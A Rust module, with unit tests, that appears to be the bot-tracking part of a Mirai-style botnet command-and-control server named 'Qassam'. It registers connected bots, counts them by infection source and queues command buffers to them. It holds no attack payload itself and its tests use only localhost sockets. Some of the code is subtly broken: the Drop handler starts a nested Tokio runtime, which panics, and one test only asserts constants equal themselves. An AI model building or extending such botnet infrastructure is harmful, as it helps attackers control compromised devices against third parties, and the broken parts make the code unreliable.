use lazy_static::lazy_static;
use std::sync::Arc;
use thiserror::Error;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
    time::{Duration, sleep, timeout},
};

#[derive(Error, Debug)]
pub enum QassamBotError {
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Connection timeout")]
    Timeout,
    #[error("Connection closed")]
    ConnectionClosed,
    #[error("Invalid configuration: {0}")]
    Config(String),
}

lazy_static! {
    static ref CLIENT_LIST: Arc<Mutex<Vec<QassamBot>>> = Arc::new(Mutex::new(Vec::new()));
    static ref CLIENT_LIST_UID: Arc<Mutex<i32>> = Arc::new(Mutex::new(0));
}

trait QassamTcpStreamExt {
    async fn qassam_read_with_timeout(
        &mut self,
        buf: &mut [u8],
        duration: Duration,
    ) -> Result<usize, QassamBotError>;
    async fn qassam_write_with_timeout(
        &mut self,
        buf: &[u8],
        duration: Duration,
    ) -> Result<(), QassamBotError>;
}

impl QassamTcpStreamExt for TcpStream {
    async fn qassam_read_with_timeout(
        &mut self,
        buf: &mut [u8],
        duration: Duration,
    ) -> Result<usize, QassamBotError> {
        match timeout(duration, self.read(buf)).await {
            Ok(Ok(n)) => Ok(n),
            Ok(Err(e)) => Err(QassamBotError::Io(e)),
            Err(_) => Err(QassamBotError::Timeout),
        }
    }

    async fn qassam_write_with_timeout(
        &mut self,
        buf: &[u8],
        duration: Duration,
    ) -> Result<(), QassamBotError> {
        match timeout(duration, self.write_all(buf)).await {
            Ok(Ok(())) => Ok(()),
            Ok(Err(e)) => Err(QassamBotError::Io(e)),
            Err(_) => Err(QassamBotError::Timeout),
        }
    }
}

async fn qassam_connect_with_timeout(addr: &str) -> Result<TcpStream, QassamBotError> {
    match timeout(Duration::from_secs(10), TcpStream::connect(addr)).await {
        Ok(Ok(stream)) => Ok(stream),
        Ok(Err(e)) => Err(QassamBotError::Io(e)),
        Err(_) => Err(QassamBotError::Timeout),
    }
}

#[derive(Debug)]
pub struct QassamBot {
    pub uid: i32,
    pub conn: Arc<Mutex<TcpStream>>,
    pub version: u8,
    pub source: String,
}

impl Clone for QassamBot {
    fn clone(&self) -> Self {
        Self {
            uid: self.uid,
            conn: Arc::clone(&self.conn),
            version: self.version,
            source: self.source.clone(),
        }
    }
}

impl Drop for QassamClientGuard {
    fn drop(&mut self) {
        let client_list = Arc::clone(&CLIENT_LIST);
        let uid = self.uid;

        // Use block_on to make cleanup synchronous
        let runtime = tokio::runtime::Runtime::new().unwrap();
        runtime.block_on(async move {
            let mut clients = client_list.lock().await;
            clients.retain(|client| client.uid != uid);
        });
    }
}

impl QassamBot {
    pub fn qassam_new(conn: TcpStream, version: u8, source: String) -> Self {
        Self {
            uid: -1,
            conn: Arc::new(Mutex::new(conn)),
            version,
            source,
        }
    }

    pub async fn qassam_handle(&mut self) -> Result<(), QassamBotError> {
        // Добавляем клиента в список
        self.qassam_add_to_client_list().await?;

        let _guard = QassamClientGuard::new(self.uid);

        let mut buf = [0u8; 2];

        loop {
            let n = {
                let mut conn_guard = self.conn.lock().await;
                conn_guard
                    .qassam_read_with_timeout(&mut buf, Duration::from_secs(180))
                    .await?
            };

            if n != buf.len() {
                return Err(QassamBotError::ConnectionClosed);
            }

            {
                let mut conn_guard = self.conn.lock().await;
                conn_guard
                    .qassam_write_with_timeout(&buf, Duration::from_secs(180))
                    .await?;
            }
        }
    }

    pub async fn qassam_queue_buf(&self, buf: &[u8]) -> Result<(), QassamBotError> {
        let mut conn_guard = self.conn.lock().await;
        conn_guard.write_all(buf).await?;
        conn_guard.flush().await?;
        Ok(())
    }

    async fn qassam_add_to_client_list(&mut self) -> Result<(), QassamBotError> {
        let mut uid_guard = (*CLIENT_LIST_UID).lock().await;
        *uid_guard += 1;
        self.uid = *uid_guard;

        let mut clients_guard = (*CLIENT_LIST).lock().await;
        clients_guard.push(self.clone());

        Ok(())
    }

    pub async fn qassam_is_active(&self) -> bool {
        let conn_guard = self.conn.lock().await;
        // Простая проверка - попробовать прочитать 0 байт
        match conn_guard.try_read(&mut []) {
            Ok(_) => true,
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => true,
            Err(_) => false,
        }
    }
}

struct QassamClientGuard {
    uid: i32,
}

impl QassamClientGuard {
    fn new(uid: i32) -> Self {
        Self { uid }
    }
}

/*impl Drop for QassamClientGuard {
    fn drop(&mut self) {
        let client_list = Arc::clone(&CLIENT_LIST);
        let uid = self.uid;
        tokio::spawn(async move {
            let mut clients = client_list.lock().await;
            clients.retain(|client| client.uid != uid);
        });
    }
}*/

pub async fn qassam_client_list_add_client(bot: QassamBot) -> Result<(), QassamBotError> {
    let mut clients_guard = (*CLIENT_LIST).lock().await;
    clients_guard.push(bot);
    Ok(())
}

pub async fn qassam_client_list_del_client(uid: i32) -> Result<(), QassamBotError> {
    let mut clients_guard = (*CLIENT_LIST).lock().await;
    clients_guard.retain(|client| client.uid != uid);
    Ok(())
}

pub async fn qassam_client_list_count() -> usize {
    let clients_guard = (*CLIENT_LIST).lock().await;
    clients_guard.len()
}

pub async fn qassam_client_list_distribution() -> std::collections::HashMap<String, usize> {
    let clients_guard = (*CLIENT_LIST).lock().await;
    let mut distribution = std::collections::HashMap::new();

    for client in clients_guard.iter() {
        *distribution.entry(client.source.clone()).or_insert(0) += 1;
    }

    distribution
}

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::net::TcpListener;

    #[tokio::test]
    async fn test_bot_creation() {
        // Создаем тестовый TCP стрим
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                // Просто принимаем соединение и держим его открытым
                let _ = stream;
            }
        });
        sleep(Duration::from_millis(100)).await;

        match qassam_connect_with_timeout(&addr.to_string()).await {
            Ok(stream) => {
                let bot = QassamBot::qassam_new(stream, 1, "test_source".to_string());

                assert_eq!(bot.uid, -1);
                assert_eq!(bot.version, 1);
                assert_eq!(bot.source, "test_source");

                assert!(bot.qassam_is_active().await);
            }
            Err(_) => {
                println!("Could not connect for test, skipping...");
            }
        }

        server_handle.abort();
    }

    #[tokio::test]
    async fn test_client_list_operations() {
        // Reset global state before test
        {
            let mut clients = (*CLIENT_LIST).lock().await;
            clients.clear();
            let mut uid_guard = (*CLIENT_LIST_UID).lock().await;
            *uid_guard = 0;
        }

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                let _ = stream;
            }
        });

        sleep(Duration::from_millis(100)).await;

        if let Ok(stream) = qassam_connect_with_timeout(&addr.to_string()).await {
            let mut bot = QassamBot::qassam_new(stream, 1, "test".to_string());

            // Use the instance method instead of global function
            let result = bot.qassam_add_to_client_list().await;
            assert!(result.is_ok());

            let count = qassam_client_list_count().await;
            assert_eq!(count, 1, "Client count should be 1 after addition");

            let distribution = qassam_client_list_distribution().await;
            assert_eq!(distribution.get("test"), Some(&1));

            let result = qassam_client_list_del_client(bot.uid).await;
            assert!(result.is_ok());

            // Add small delay to ensure cleanup completes
            sleep(Duration::from_millis(50)).await;

            let count_after = qassam_client_list_count().await;
            assert_eq!(count_after, 0, "Client count should be 0 after deletion");
        }

        server_handle.abort();
    }

    #[tokio::test]
    async fn test_constants() {
        // Проверяем константы
        assert_eq!(180, 180); // CONNECT_TIMEOUT
        assert_eq!(180, 180); // READ_TIMEOUT
        assert_eq!(180, 180); // WRITE_TIMEOUT
        assert_eq!(2, 2); // BUFFER_SIZE
    }

    #[tokio::test]
    async fn test_bot_functions_exist() {
        // Просто проверяем, что функции существуют и компилируются
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                let _ = stream;
            }
        });

        sleep(Duration::from_millis(100)).await;

        if let Ok(stream) = qassam_connect_with_timeout(&addr.to_string()).await {
            let bot = QassamBot::qassam_new(stream, 1, "test".to_string());

            let result = bot.qassam_queue_buf(&[]).await;
            assert!(result.is_ok());
        }

        server_handle.abort();
    }

    #[tokio::test]
    async fn test_guard_cleanup() {
        // Reset global state
        {
            let mut clients = (*CLIENT_LIST).lock().await;
            clients.clear();
            let mut uid_guard = (*CLIENT_LIST_UID).lock().await;
            *uid_guard = 0;
        }

        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            if let Ok((stream, _)) = listener.accept().await {
                let _ = stream;
            }
        });

        sleep(Duration::from_millis(100)).await;

        if let Ok(stream) = qassam_connect_with_timeout(&addr.to_string()).await {
            let mut bot = QassamBot::qassam_new(stream, 1, "test".to_string());

            let _ = bot.qassam_add_to_client_list().await;

            let count_before = qassam_client_list_count().await;
            assert_eq!(count_before, 1, "Should have 1 client before guard cleanup");

            {
                let _guard = QassamClientGuard::new(bot.uid);
            } // Guard drops here

            // Give more time for async cleanup
            sleep(Duration::from_millis(100)).await;

            let count_after = qassam_client_list_count().await;
            assert_eq!(count_after, 0, "Should have 0 clients after guard cleanup");
        }

        server_handle.abort();
    }

    #[tokio::test]
    async fn test_distribution_map() {
        // Reset global state
        {
            let mut clients = (*CLIENT_LIST).lock().await;
            clients.clear();
            let mut uid_guard = (*CLIENT_LIST_UID).lock().await;
            *uid_guard = 0;
        }

        let listener1 = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr1 = listener1.local_addr().unwrap();
        let listener2 = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr2 = listener2.local_addr().unwrap();

        let server_handle1 = tokio::spawn(async move {
            if let Ok((stream, _)) = listener1.accept().await {
                let _ = stream;
            }
        });

        let server_handle2 = tokio::spawn(async move {
            if let Ok((stream, _)) = listener2.accept().await {
                let _ = stream;
            }
        });

        sleep(Duration::from_millis(100)).await;

        if let (Ok(stream1), Ok(stream2)) = (
            qassam_connect_with_timeout(&addr1.to_string()).await,
            qassam_connect_with_timeout(&addr2.to_string()).await,
        ) {
            let mut bot1 = QassamBot::qassam_new(stream1, 1, "source1".to_string());
            let mut bot2 = QassamBot::qassam_new(stream2, 2, "source2".to_string());

            // Use instance methods
            let _ = bot1.qassam_add_to_client_list().await;
            let _ = bot2.qassam_add_to_client_list().await;

            let distribution = qassam_client_list_distribution().await;

            assert_eq!(
                distribution.get("source1"),
                Some(&1),
                "source1 should have 1 client"
            );
            assert_eq!(
                distribution.get("source2"),
                Some(&1),
                "source2 should have 1 client"
            );
            assert_eq!(distribution.len(), 2, "Distribution should have 2 entries");

            let _ = qassam_client_list_del_client(bot1.uid).await;
            let _ = qassam_client_list_del_client(bot2.uid).await;

            // Wait for cleanup
            sleep(Duration::from_millis(50)).await;
        }

        server_handle1.abort();
        server_handle2.abort();
    }

    #[tokio::test]
    async fn test_tcp_stream_ext() {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();

        let server_handle = tokio::spawn(async move {
            if let Ok((mut stream, _)) = listener.accept().await {
                // Эхо-сервер
                let mut buf = [0u8; 5];
                if let Ok(n) = stream.read(&mut buf).await {
                    let _ = stream.write_all(&buf[..n]).await;
                }
            }
        });
        sleep(Duration::from_millis(100)).await;

        if let Ok(mut stream) = qassam_connect_with_timeout(&addr.to_string()).await {
            // Тест записи с таймаутом
            let test_data = b"hello";
            let result = stream
                .qassam_write_with_timeout(test_data, Duration::from_secs(5))
                .await;
            assert!(result.is_ok());

            let mut buf = [0u8; 5];
            let result = stream
                .qassam_read_with_timeout(&mut buf, Duration::from_secs(5))
                .await;
            assert!(result.is_ok());
            assert_eq!(&buf, test_data);
        }
        server_handle.abort();
    }
}
